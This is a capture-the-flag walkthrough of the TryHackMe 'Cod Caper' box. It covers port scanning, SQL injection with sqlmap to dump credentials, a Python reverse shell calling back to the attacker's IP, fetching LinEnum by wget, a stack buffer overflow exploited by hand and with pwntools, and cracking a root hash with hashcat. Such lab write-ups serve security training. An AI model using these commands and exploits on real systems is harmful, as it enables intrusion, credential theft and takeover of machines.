---
title: 'The Cod Caper'
---

- [Tools & Commands](#tools-&-commands)
- [2 - Enumeration](#2---enumeration)
- [3 - Web Enumeration](#3---web-enumeration)
- [4 - Web Exploitation](#4---web-exploitation)
- [5 - Command Execution](#5---command-execution)
- [6 - LinEnum](#6---linenum)
- [7 - pwndbg](#7---pwndbg)
- [8 - Binary Exploitation: Manually](#8---binary-exploitation:-manually)
- [9 - Binary Exploitation: pwntools](#9---binary-exploitation:-pwntools)
- [10 - Finishing the job](#10---finishing-the-job)

## Tools & Commands

- nmap
- gobuster
- sqlmap
- nc
- python
- python3
- scp
- LinEnum
- pwndbg
- hashcat

## 2 - Enumeration

```bash
$ nmap 10.10.249.70 -v
22/tcp open  ssh
80/tcp open  http

$ nmap 10.10.249.70 -v -A -p22,80
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6d:2c:40:1b:6c:15:7c:fc:bf:9b:55:22:61:2a:56:fc (RSA)
|   256 ff:89:32:98:f4:77:9c:09:39:f5:af:4a:4f:08:d6:f5 (ECDSA)
|_  256 89:92:63:e7:1d:2b:3a:af:6c:f9:39:56:5b:55:7e:f9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 3 - Web Enumeration

```bash
$ gobuster dir -u 10.10.249.70 -w /usr/share/wordlists/dirb/big.txt -x "php,txt"
```

## 4 - Web Exploitation

```bash
$ sqlmap -u http://10.10.239.224/administrator.php --forms -dbs
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] users

$ sqlmap -u http://10.10.239.224/administrator.php --forms -D users --tables
Database: users
[1 table]
+-------+
| users |
+-------+

$ sqlmap -u http://10.10.239.224/administrator.php --forms -D users -T users --columns
Database: users
Table: users
[2 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| password | varchar(100) |
| username | varchar(100) |
+----------+--------------+

$ sqlmap -u http://10.10.239.224/administrator.php --forms -D users -T users --dump
Database: users
Table: users
[1 entry]
+----------+------------+
| username | password   |
+----------+------------+
| pingudad | secretpass |
+----------+------------+
```

## 5 - Command Execution

login with creds

```bash
# from kali
nc -nvlp 4444

# from target
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<TryHackMe-VPN-IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
# other reverse shells didn't work

$ whoami
$ ls
$ cat /etc/passwd
$ find / -user www-data 2>/dev/null
$ cat /var/hidden/pass
pinguapingu
```

## 6 - LinEnum

```bash
$ scp LinEnum.sh pingu@10.10.207.180:/tmp

# or

$ python -m SimpleHTTPServer 4444
# or
$ python3 -m http.server 4444

pingu@ubuntu:~$ wget http://<TryHackMe-VPN-IP>:4444/LinEnum.sh
pingu@ubuntu:~$ chmod +x LinEnum.sh
pingu@ubuntu:~$ ./LinEnum.sh
[...]
/opt/secret/root
[...]
```

## 7 - pwndbg

![the-cod-caper_img1](../img/the-cod-caper_img1.png)

```bash
pingu@ubuntu:~$ gdb /opt/secret/root
pwndbg> r < <(cyclic 50)
pwndbg> cyclic -l 0x6161616c
44
```

## 8 - Binary Exploitation: Manually

```bash
pwndbg> disassemble shell
Dump of assembler code for function shell:
   0x080484cb <+0>:     push   ebp
[...]

pingu@ubuntu:~$ python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root
# or
pingu@ubuntu:~$ python -c 'import struct;print "A"*44 + struct.pack("<I",0x080484cb)' | /opt/secret/root

root:$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:18277:0:99999:7:::
```

## 9 - Binary Exploitation: pwntools

```python
# exploit.py

from pwn import *
proc = process('/opt/secret/root')
elf = ELF('/opt/secret/root')
shell_func = elf.symbols.shell
payload = fit({
44: shell_func # this adds the value of shell_func after 44 characters
})
proc.sendline(payload)
proc.interactive()
```

```bash
pingu@ubuntu:~$ python exploit.py 
[+] Starting local process '/opt/secret/root': pid 1497
[*] '/opt/secret/root'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[*] Switching to interactive mode
[*] Process '/opt/secret/root' stopped with exit code -11 (SIGSEGV) (pid 1497)
root:$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:18277:0:99999:7:::
```

## 10 - Finishing the job

```bash
$ hashcat -a0 -m1800 codcaperhash /usr/share/wordlists/rockyou.txt

# use host machine to use GPU, ~15x faster
>hashcat.exe -a0 -m1800 copcaperhash rockyou.txt

$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:love2fish
```